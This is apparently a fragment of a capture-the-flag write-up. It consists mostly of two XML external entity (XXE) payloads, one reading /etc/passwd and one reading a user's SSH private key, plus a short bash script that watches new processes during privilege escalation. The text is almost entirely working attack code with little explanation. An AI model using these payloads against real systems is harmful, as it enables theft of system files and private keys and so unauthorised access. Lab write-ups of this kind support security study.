```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<details>
	<subnet_mask>&xxe;</subnet_mask>
	<test></test>
</details>
```
And, once you recieve the output you'll find out that there's a user called florian that has the id_rsa vulnerable so:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/florian/.ssh/id_rsa"> ]>
<details>
	<subnet_mask>&xxe;</subnet_mask>
	<test></test>
</details>
```
procmon.sh coding:
```
#!/bin/bash

old_process=$(ps -eo user,command)
while true
do
	new_process=$(ps -eo user,command)
	diff <(echo "$old_process") <(echo "$new_process") | grep "[>\<\]" | grep -vE "kworker|command|pspy"
	old_process=$new_process
done
```